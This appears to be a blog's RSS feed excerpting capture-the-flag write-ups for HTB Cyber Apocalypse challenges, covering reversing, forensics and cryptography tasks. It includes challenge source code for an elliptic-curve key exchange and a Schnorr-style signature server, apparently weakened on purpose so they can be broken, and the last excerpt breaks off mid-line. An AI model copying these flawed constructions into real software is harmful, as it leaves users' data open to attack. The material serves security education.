<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>HTB Cyber Apocalypse on 7Rocky's Blog. Cybersecurity and Maths</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/</link><description>Recent content in HTB Cyber Apocalypse on 7Rocky's Blog. Cybersecurity and Maths</description><generator>Hugo</generator><language>en</language><atom:link href="https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/index.xml" rel="self" type="application/rss+xml"/><item><title>Alien Saboteaur</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/alien-saboteaur/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/alien-saboteaur/</guid><description>&lt;p>We are given a binary file called &lt;code>vm&lt;/code> and a program called &lt;code>bin&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">file&lt;/span> &lt;span class="code-dark-blue">*&lt;/span>
bin: data
vm: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=10fb238b19d3a82b46536b51e47396525086a09c, for GNU/Linux 3.2.0, not stripped 
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="setup-environment">Setup environment&lt;/h2>
&lt;p>The binary needs a recent version of Glibc in order to run:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">./vm&lt;/span>
./vm: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./vm) 
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>To solve this issue, we can run Ubuntu 22.04 in a Docker container and take the library and loader and patch the binary:&lt;/p></description></item><item><title>Arranged</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/arranged/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/arranged/</guid><description>&lt;p>We are given the SageMath source code to encrypt the flag:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Cipher&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">AES&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Util&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Padding&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pad&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Util&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">number&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">hashlib&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">sha256&lt;/span>

&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> secret &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">FLAG&lt;/span>&lt;span class="mtk1">, p, b, priv_a, priv_b&lt;/span>

&lt;span class="mtk1">F&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> GF(p)&lt;/span>
&lt;span class="mtk1">E&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> EllipticCurve(&lt;/span>&lt;span class="mtk1">F&lt;/span>&lt;span class="mtk1">, [&lt;/span>&lt;span class="mtk6">726&lt;/span>&lt;span class="mtk1">, b])&lt;/span>
&lt;span class="mtk1">G&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">E&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">92664443700060421744731665585720229740257255936853&lt;/span>&lt;span class="mtk6">89789128881064194700114878783516673806793236640623&lt;/span>&lt;span class="mtk6">62524967242819810112524880301882054682462685841995&lt;/span>&lt;span class="mtk6">367&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">48568029557806042414031557727826142240574624266190&lt;/span>&lt;span class="mtk6">61437325274365157616489963087648882578621484232159&lt;/span>&lt;span class="mtk6">43934426386324619172945855063250025970285111571580&lt;/span>&lt;span class="mtk6">3253&lt;/span>&lt;span class="mtk1">)&lt;/span> 

&lt;span class="mtk1">A&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">G&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> priv_a&lt;/span>
&lt;span class="mtk1">B&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">G&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> priv_b&lt;/span>

&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">A&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">B&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1">C&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> priv_a &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">B&lt;/span>

&lt;span class="mtk5">assert&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">C&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> priv_b &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">A&lt;/span>

&lt;span class="mtk3"># now use it as shared secret&lt;/span>
&lt;span class="mtk1">secret&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">C&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">]&lt;/span>

&lt;span class="mtk1">hash&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">sha256&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1">hash&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">update&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">secret&lt;/span>&lt;span class="mtk1">))&lt;/span>

&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">hash&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">digest&lt;/span>&lt;span class="mtk1">()[&lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">:&lt;/span>&lt;span class="mtk6">32&lt;/span>&lt;span class="mtk1">]&lt;/span>
&lt;span class="mtk1">iv&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">b&lt;/span>&lt;span class="mtk4">'u&lt;/span>&lt;span class="mtk6">\x8f&lt;/span>&lt;span class="mtk4">o&lt;/span>&lt;span class="mtk6">\x9a&lt;/span>&lt;span class="mtk4">K&lt;/span>&lt;span class="mtk6">\xc5\x17\xa7&lt;/span>&lt;span class="mtk4">&amp;gt;[&lt;/span>&lt;span class="mtk6">\x18\xa3\xc5\x11\x9e&lt;/span>&lt;span class="mtk4">n'&lt;/span>
&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">AES&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">new&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8 mtku">AES&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">MODE_CBC&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">iv&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1">encrypted&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">pad&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">FLAG&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">encrypted&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>Moreover, we have the output of the script:&lt;/p></description></item><item><title>Artifacts of Dangerous Sightings</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/artifacts-of-dangerous-sightings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/artifacts-of-dangerous-sightings/</guid><description>&lt;p>We are given a Windows disk image inside a folder called &lt;code>HostEvidence_PANDORA&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">file&lt;/span> &lt;span class="mtku">HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx&lt;/span>
HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx: Microsoft Disk Image eXtended, by .NET DiscUtils, sequence 0x8, NO Log Signature; region, 2 entries, id Metadata, at 0x200000, Required 1, id BAT, at 0x300000, Required 1 
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>If we switch to a Windows machine and mount the disk image, we will have the following folders:&lt;/p>
&lt;p>&lt;img alt="Artifacts of Dangerous Sightings 1" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202023/Artifacts-of-Dangerous-Sightings-1.webp">&lt;/p>
&lt;h2 id="analyzing-the-disk-image">Analyzing the disk image&lt;/h2>
&lt;p>Basically, it is the &lt;code>C:\&lt;/code> drive of a Windows machine. If we analyze the PowerShell history of user &lt;code>Pandora&lt;/code> we see something interesting:&lt;/p></description></item><item><title>Bashic Ransomware</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/bashic-ransomware/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/bashic-ransomware/</guid><description>&lt;p>We are given these files:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">file&lt;/span> &lt;span class="code-dark-blue">*&lt;/span>
flag.txt.a59ap: GPG symmetrically encrypted data (AES256 cipher)
forensics.mem: data
linux-image-5.10.0-21.zip: Zip archive data, at least v2.0 to extract, compression method=deflate 
traffic.pcap: pcapng capture file - version 1.0
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>We can guess that we will need to analyze a compromised Linux machine because we are given a memory dump (&lt;code>forensics.mem&lt;/code>) and a profile for &lt;a target="_blank" href="https://volatility3.readthedocs.io/en/latest/index.html">&lt;code>volatility&lt;/code>&lt;/a>.&lt;/p>
&lt;h2 id="network-traffic-analysis">Network traffic analysis&lt;/h2>
&lt;p>Let&amp;rsquo;s start using Wireshark to analyze the PCAP:&lt;/p>
&lt;p>&lt;img alt="Bashic Ransomware 1" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202023/Bashic-Ransomware-1.webp">&lt;/p></description></item><item><title>Biased Heritage</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/biased-heritage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/biased-heritage/</guid><description>&lt;p>This challenge is kind of a continuation of &lt;a target="_blank" href="../colliding-heritage">Colliding Heritage&lt;/a>. We are provided with the server source code in Python:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk3">#!/usr/bin/env python3&lt;/span>

&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">signal&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">secrets&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">randbelow&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">hashlib&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">sha256&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Util&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">number&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">isPrime&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">getPrime&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">bytes_to_long&lt;/span>

&lt;span class="mtk1">FLAG&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"HTB{???????????????????????????????????????}"&lt;/span>


&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">SHA256chnorr&lt;/span>&lt;span class="mtk1">:&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7">__init__&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3"># while True:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3"># self.q = getPrime(512)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3"># self.p = 2*self.q + 1&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3"># if isPrime(self.p):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3"># break&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">0x&lt;/span>&lt;span class="mtk6">184e26a581fca2893b2096528eb6103ac03f60b023e1284ebd&lt;/span>&lt;span class="mtk6">a3ab24ad9a9fe0e37b33eeecc4b3c3b9e50832fd856e9889f6&lt;/span>&lt;span class="mtk6">c9a10cde54ee798a7c383d0d8d2c3&lt;/span> 
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">//&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">2&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">g&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">3&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">x&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">randbelow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">y&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">g&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">x&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">H&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">bytes_to_long&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">sha256&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">).&lt;/span>&lt;span class="mtk8">digest&lt;/span>&lt;span class="mtk1">()) &lt;/span>&lt;span class="mtk5">%&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">sign&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">k&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">H&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">x&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">g&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">k&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">%&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">H&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk1">k&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">x&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">%&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">verify&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">sig&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">sig&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">not&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;lt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;lt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">False&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">not&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;lt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;lt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">False&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">rv&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">g&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">y&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span 